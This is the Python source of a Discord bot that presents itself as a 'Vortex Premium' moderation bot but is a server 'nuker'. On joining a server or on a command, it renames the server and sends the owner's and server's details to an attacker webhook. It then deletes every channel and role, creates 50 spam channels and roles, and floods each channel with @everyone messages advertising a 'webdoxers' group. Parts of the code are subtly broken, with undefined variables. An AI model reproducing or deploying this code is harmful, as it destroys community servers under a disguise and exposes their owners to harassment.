# coding: utf-8
import discord
import aiohttp
import time
import asyncio
import dhooks
import random
import typing
import datetime
from random import randint
from time import sleep
from dhooks import Webhook
from discord.ext import commands
from discord.ext.commands import Bot
from discord.utils import get
from os import system, name
from discord.ext.commands import cooldown, BucketType

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='>>', intents=intents)
client.remove_command('help')

logshook = 'хук с логами'

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Vortex Premium", description="https://discord.gg/lavanbot", state="Support server"))

@client.event
async def on_guild_join(guild):
        with open('vortex.png', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crash By Vortex Premium", icon=icon)   

        async with aiohttp.ClientSession() as session: # с помощью aiohttp отправляем лог на вебхук
            hook = discord.Webhook.from_url(logshook, adapter=discord.AsyncWebhookAdapter(session))
            embed = discord.Embed(
                title = f'Vortex Premium Logs | {guild.name}',
                description = f'**ID:** `{guild.id}`\n**Владелец:** `{guild.owner}`\n**Участников:** `{len(guild.members)}`\n**Количество каналов:** `{len(guild.channels)}`\n**Количество ролей:** `{len(guild.roles)}`',
                colour = discord.Colour.from_rgb(214,5,9)
            )
            embed.set_thumbnail(url=guild.icon_url)
            await hook.send(embed=embed)

        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 

        for roles in guild.roles:
            try:
                await roles.delete()
            except:
                try:
                    await roles.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 

        for _ in range(50):
            await guild.create_text_channel('crash-by-vortex-premium')

        for _ in range(50):
          await guild.create_role(name='Crash By Vortex Premium', color = 0xff0000)    


@client.command()
async def extra(ctx):
        with open('vortex.png', 'rb') as f:
            icon = f.read()
        await ctx.guild.edit(name="Crash By Vortex Premium", icon=icon)   
        
        async with aiohttp.ClientSession() as session: # с помощью aiohttp отправляем лог на вебхук
            webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
            embed = discord.Embed(
                title = f'Vortex Premium Logs | {ctx.guild.name}',
                description = f'**ID:** `{ctx.guild.id}`\n**Владелец:** `{ctx.guild.owner}`\n**Участников:** `{len(ctx.guild.members)}`\n**Количество каналов:** `{len(ctx.guild.channels)}`\n**Количество ролей:** `{len(ctx.guild.roles)}`',
                colour = discord.Colour.from_rgb(214,5,9)
            )
            embed.set_thumbnail(url=guild.icon_url)
            await webhook.send(embed=embed)

        for channel in ctx.guild.channels:
            try:
                await ctx.channel.delete()
            except:
                try:
                    await ctx.channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 

        for roles in ctx.guild.roles:
            try:
                await ctx.roles.delete()
            except:
                try:
                    await ctx.roles.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 

        for _ in range(50):
            await ctx.guild.create_text_channel('crash-by-vortex-premium')

        for _ in range(50):
          await ctx.guild.create_role(name='Crash By Vortex Premium', color = 0xff0000)    



@client.command()
async def help(ctx):
  embed = discord.Embed(
    description = """**📜 General Commands**
>>help general
​
**📜 Moderation Commands**
**[>>help moderation](https://discord.gg/lavanbot)**
​
**📜 Settings Commands**
**[>>help settings](https://discord.gg/lavanbot)**
​
**📜 AutoMod Commands**
**[>>help automod](https://discord.gg/lavanbot)**
​
**📜 Tools Commands**
**[>>help tools](https://discord.gg/lavanbot)**
​
**Additional Help**
[🔗 Vortex Wiki](https://discord.gg/lavanbot)
[📜 Full Command Reference](https://discord.gg/lavanbot)""",
    color = 0xF1C40F
    )
  await ctx.author.send("**Vortex Premium** Commands Categories:", embed=embed)

@client.event
async def on_guild_channel_create(channel):
  if isinstance(channel, discord.TextChannel):
    if channel.name == 'crash-by-vortex-premium':
      webhook = await channel.create_webhook(name = "Crashed By Vortex premium")
      webhook_url = webhook.url
      async with aiohttp.ClientSession() as session:
          webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
          for _ in range(100):
              try:
                  await webhook.send("""||@everyone @here|| Данный сервер крашится, прошу вас уже ничего не делать, и смириться с этим.\n А также советую перейти на наш дискорд сервер - https://discord.gg/lavanbot , там тебя этому научат.\n Также подпишитесь на группу в вк - https://vk.com/webdoxers""")
              except:
                  break

token = "ваш токен"
client.run(token)
